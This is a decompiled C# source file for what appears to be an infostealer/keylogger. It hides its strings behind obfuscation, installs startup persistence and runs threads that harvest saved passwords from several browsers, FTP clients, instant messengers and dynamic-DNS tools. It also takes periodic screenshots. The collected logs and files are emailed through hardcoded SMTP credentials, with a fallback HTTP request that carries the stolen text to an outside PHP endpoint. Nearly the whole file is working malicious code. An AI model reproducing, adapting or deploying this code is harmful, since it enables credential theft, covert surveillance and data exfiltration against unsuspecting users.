using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using My;

public class NTUIYURW
{
	public static string NOMBKE;

	public static string QEFKD;

	public static string PRLLJ;

	public static string FFInfo;

	public static string RGCWC;

	public static string MSTUG;

	public static string MVUKM;

	public static string JGUON;

	public static string QDSHCHY;

	public static string IQJJIGG;

	public static string LPGRPPC;

	public static string WNKBHEQ;

	public static string CEGKPHV;

	public static string YIGWEOPP;

	public static string KSQKXQN = "";

	public static string PNPIWT = GOSLWHR.WHJBIYT("mZuoxqORpaq+foanprWqTZ20uSs=", "False");

	public static string OTCKCI = GOSLWHR.WHJBIYT("fqiwv6d8pHV6ais=", "False");

	public static string OLSECGTX = GOSLWHR.WHJBIYT("kqe5vGyGp6a1qk2dtLkr", "False");

	public static int JRTBUMFP = 587;

	public static string WXQBQYBX = GOSLWHR.WHJBIYT("DLEXSite", "False");

	public static string CIOUBCOI = GOSLWHR.WHJBIYT("USERSITE", "False");

	public static string KNSLICKO = GOSLWHR.WHJBIYT("USERTYPE", "False");

	public static string TOQUL = GOSLWHR.WHJBIYT("USERTITLE", "False");

	public static string USRSF = GOSLWHR.WHJBIYT("USERBODY", "False");

	public static string TCGXU = GOSLWHR.WHJBIYT("USERSCREENSHOTS", "False");

	public static string GFGXH = GOSLWHR.WHJBIYT("gbfN278L", "False");

	public static int HSQTT = 1200000;

	public static string IUSWG = "";

	public static string JOJFO = "";

	public static int number = 0;

	public static VPXNIVH GLGWPJK;

	public static Thread RKUSLCK = new Thread(GVCLT);

	public static Thread GCThread = new Thread(DAChrome.GTCHRME);

	public static Thread JSIUE = new Thread(GKKNH);

	public static Thread STRTTHRD = new Thread(DAStartup.Startupdll.StartPers);

	public static Thread IDMThread = new Thread(DAIDM.IDMdll.GTMYIDM);

	public static Thread CREFTPThread = new Thread(DACore.Coredll.GTMYCore);

	public static Thread NMBZZThread = new Thread(DANMBZZ.NMBZZdll.nimmbuzz);

	public static Thread PGDNThread = new Thread(DAPGDN.PGDNdll.GTMYPig);

	public static Thread SMRTFTPThread = new Thread(DASMRTFTP.Smartdll.GTMYSmart);

	public static Thread DynDNSThread = new Thread(DADynDNS.DynDNSdll.GetDADyn);

	public static Thread NoipThread = new Thread(DANoip.Noipdll.GTMYNo);

	[STAThread]
	public static void Main()
	{
		int num = default(int);
		try
		{
			IntPtr intPtr2 = (Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
			}
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
			}
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), (SearchOption)3, new string[1] { "*.png*" }))
			{
				File.Delete(file);
			}
			foreach (string file2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
			{
				File.Delete(file2);
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			STRTTHRD.IsBackground = true;
			STRTTHRD.Start();
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4, num);
			ProjectData.ClearProjectError();
		}
		int num2 = 0;
		while (true)
		{
			num = 1;
			try
			{
				if (num2 == 3)
				{
					Application.Restart();
				}
				GLGWPJK = new VPXNIVH(JOJFO);
				VPXNIVH.HFJBSVH();
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5, num);
				num2 = checked(num2 + 1);
				ProjectData.ClearProjectError();
				continue;
			}
			break;
		}
		try
		{
			RKUSLCK.IsBackground = true;
			RKUSLCK.Start();
		}
		catch (Exception ex6)
		{
			ProjectData.SetProjectError(ex6, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			GCThread.IsBackground = true;
			GCThread.Start();
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			DASafari.SFRIDL sFRIDL = new DASafari.SFRIDL();
			sFRIDL.SAFRGT();
		}
		catch (Exception ex8)
		{
			ProjectData.SetProjectError(ex8, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			new DAOpera.Operaz();
			DAOpera.Operaz.FPQX();
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("k6SwpsWrgMHGEw==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("jZnAwcKgv8bExI2OuMG7przKuqKEjsbSfpWuFw==", "False"), overwrite: true);
		}
		catch (Exception ex10)
		{
			ProjectData.SetProjectError(ex10, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("goa8vKhosMCvmIu1wLyzjbSotKiJsMHBuZkh", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("iZW8vb6cu8LAwImKtL23orjGtq2Qq8LPuqG7Gw==", "False"), overwrite: true);
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("jZ640LVzu8u9kZSvxtO+pb+Fx76aFg==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("lqLJysupyM/NzZaXwcrEr8XTw6ubx8WpyK60ocq8qcrO28xovs7QEA==", "False"), overwrite: true);
		}
		catch (Exception ex12)
		{
			ProjectData.SetProjectError(ex12, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("mYbQ08qiu9XLwrG0z8vPscTS0cWrCg==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("gIyztLWTsrm3t4CBq7Suma+9ra+Fsr69sououCU=", "False"), overwrite: true);
		}
		catch (Exception ex13)
		{
			ProjectData.SetProjectError(ex13, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("g4S2yKmWq7uwvYiuubm6VaauyCM=", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("l6PKy8yqydDOzpeYwsvFsMbUxNGcws3Nzmm6wtwP", "False"), overwrite: true);
		}
		catch (Exception ex14)
		{
			ProjectData.SetProjectError(ex14, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("k6XN08qguNbAyZzG0c3EnsUR", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("gY20tbaUs7q4uIGCrLWvmrC+rreKtL+7soyzIw==", "False"), overwrite: true);
		}
		catch (Exception ex15)
		{
			ProjectData.SetProjectError(ex15, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("hou5w66ErrzDqoa4ucuul6a+uLCPt37PtpYd", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("jprBwsOhwMfFxY6PucK8p73Lu5ebub3Zup65ubK6prLLjcmfuRY=", "False"), overwrite: true);
		}
		catch (Exception ex16)
		{
			ProjectData.SetProjectError(ex16, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			IDMThread.IsBackground = true;
			IDMThread.Start();
		}
		catch (Exception ex17)
		{
			ProjectData.SetProjectError(ex17, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			CREFTPThread.IsBackground = true;
			CREFTPThread.Start();
		}
		catch (Exception ex18)
		{
			ProjectData.SetProjectError(ex18, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			NMBZZThread.IsBackground = true;
			NMBZZThread.Start();
		}
		catch (Exception ex19)
		{
			ProjectData.SetProjectError(ex19, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			PGDNThread.IsBackground = true;
			PGDNThread.Start();
		}
		catch (Exception ex20)
		{
			ProjectData.SetProjectError(ex20, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			SMRTFTPThread.IsBackground = true;
			SMRTFTPThread.Start();
		}
		catch (Exception ex21)
		{
			ProjectData.SetProjectError(ex21, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			DAMSN.MSNdll.GTMSN();
		}
		catch (Exception ex22)
		{
			ProjectData.SetProjectError(ex22, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			DynDNSThread.IsBackground = true;
			DynDNSThread.Start();
		}
		catch (Exception ex23)
		{
			ProjectData.SetProjectError(ex23, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			NoipThread.IsBackground = true;
			NoipThread.Start();
		}
		catch (Exception ex24)
		{
			ProjectData.SetProjectError(ex24, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			JSIUE.IsBackground = true;
			JSIUE.Start();
		}
		catch (Exception ex25)
		{
			ProjectData.SetProjectError(ex25, num);
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	public static void QECQV(ref double YQPWO)
	{
		try
		{
			DateTime t = DateAndTime.get_Now().AddSeconds(YQPWO);
			while (DateTime.Compare(DateAndTime.get_Now(), t) < 0)
			{
				Application.DoEvents();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void GVCLT()
	{
		//IL_010c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		string text = "";
		checked
		{
			while (true)
			{
				Thread.Sleep(HSQTT);
				text = "";
				string text2 = "";
				double YQPWO = 0.2;
				QECQV(ref YQPWO);
				try
				{
					WebClient webClient = new WebClient();
					text2 = GOSLWHR.WHJBIYT("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False") + Environment.NewLine + Environment.NewLine + webClient.DownloadString(GOSLWHR.WHJBIYT("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + Environment.NewLine + Environment.NewLine + GOSLWHR.WHJBIYT("enaCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeDqSs=", "False");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					text2 = "";
					ProjectData.ClearProjectError();
				}
				YQPWO = 1.0;
				QECQV(ref YQPWO);
				try
				{
					if (Operators.CompareString(TCGXU, GOSLWHR.WHJBIYT("mNHf1gY=", "False"), false) == 0)
					{
						Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
						Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
						Graphics val2 = Graphics.FromImage((Image)(object)val);
						val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
						Bitmap val3 = val;
						((Image)val3).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + number + GOSLWHR.WHJBIYT("ZsPMzBI=", "False"));
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				YQPWO = 0.3;
				QECQV(ref YQPWO);
				try
				{
					if (Operators.CompareString(JOJFO, "", false) != 0)
					{
						IUSWG = JOJFO + Environment.NewLine + Environment.NewLine + text2 + Environment.NewLine + Environment.NewLine + text;
						try
						{
							MailMessage mailMessage = new MailMessage();
							MailMessage mailMessage2 = mailMessage;
							mailMessage2.From = new MailAddress(PNPIWT);
							mailMessage2.To.Add(PNPIWT);
							mailMessage2.Subject = GOSLWHR.WHJBIYT("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + GOSLWHR.WHJBIYT("aQ0=", "False") + Environment.MachineName.ToString();
							mailMessage2.Body = IUSWG;
							try
							{
								if (Operators.CompareString(TCGXU, GOSLWHR.WHJBIYT("mNHf1gY=", "False"), false) == 0)
								{
									Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + number + GOSLWHR.WHJBIYT("ZsPMzBI=", "False"));
									mailMessage2.Attachments.Add(item);
								}
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
							mailMessage2 = null;
							SmtpClient smtpClient = new SmtpClient(OLSECGTX);
							SmtpClient smtpClient2 = smtpClient;
							smtpClient2.Port = JRTBUMFP;
							smtpClient2.EnableSsl = true;
							smtpClient2.Credentials = new NetworkCredential(PNPIWT, OTCKCI);
							smtpClient2.Send(mailMessage);
							smtpClient2 = null;
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							try
							{
								string text3 = "http://lls.3owl.com/zztop.php";
								_ = (HttpWebResponse)WebRequest.Create(text3 + "?to=" + PNPIWT + "&subject=" + Strings.Replace(GOSLWHR.WHJBIYT("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + GOSLWHR.WHJBIYT("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(IUSWG, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + PNPIWT).GetResponse();
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
				IUSWG = "";
				JOJFO = "";
				KSQKXQN = "";
				number++;
			}
		}
	}

	public static void GKKNH()
	{
		_ = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("eoatrq+NrLOxsXp7pa6ok6m3pyw=", GOSLWHR.WHJBIYT("g7nP3cEJ", "False"))).Length;
		DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("eoatrq+NrLOxsXp7pa6ok6m3pyw=", GOSLWHR.WHJBIYT("g7nP3cEJ", "False")));
		FileInfo[] files = directoryInfo.GetFiles();
		try
		{
			double YQPWO = 25.0;
			QECQV(ref YQPWO);
			string text = NOMBKE.ToString() + Environment.NewLine + Environment.NewLine + QEFKD + Environment.NewLine + Environment.NewLine + PRLLJ + Environment.NewLine + Environment.NewLine + RGCWC + Environment.NewLine + Environment.NewLine + MSTUG + Environment.NewLine + Environment.NewLine + MVUKM + Environment.NewLine + Environment.NewLine + JGUON + Environment.NewLine + Environment.NewLine + QDSHCHY + Environment.NewLine + Environment.NewLine + LPGRPPC + Environment.NewLine + Environment.NewLine + WNKBHEQ + Environment.NewLine + Environment.NewLine + CEGKPHV + Environment.NewLine + Environment.NewLine + YIGWEOPP;
			if (!((Operators.CompareString(text, "", false) != 0) | (Operators.CompareString(text, (string)null, false) != 0)))
			{
				return;
			}
			try
			{
				MailMessage mailMessage = new MailMessage();
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.From = new MailAddress(PNPIWT);
				mailMessage2.To.Add(PNPIWT);
				mailMessage2.Subject = GOSLWHR.WHJBIYT("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + GOSLWHR.WHJBIYT("aQ0=", GOSLWHR.WHJBIYT("g7nP3cEJ", "False")) + Environment.MachineName.ToString();
				mailMessage2.Body = text;
				try
				{
					FileInfo[] array = files;
					foreach (FileInfo fileInfo in array)
					{
						Attachment item = new Attachment(fileInfo.FullName);
						mailMessage2.Attachments.Add(item);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				mailMessage2 = null;
				SmtpClient smtpClient = new SmtpClient(OLSECGTX);
				SmtpClient smtpClient2 = smtpClient;
				smtpClient2.Port = JRTBUMFP;
				smtpClient2.EnableSsl = true;
				smtpClient2.Credentials = new NetworkCredential(PNPIWT, OTCKCI);
				smtpClient2.Send(mailMessage);
				smtpClient2 = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					string text2 = "http://lls.3owl.com/zztop.php";
					_ = (HttpWebResponse)WebRequest.Create(text2 + "?to=" + PNPIWT + "&subject=" + Strings.Replace(GOSLWHR.WHJBIYT("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + GOSLWHR.WHJBIYT("aQ0=", GOSLWHR.WHJBIYT("g7nP3cEJ", "False")) + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(text, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + PNPIWT).GetResponse();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}
}
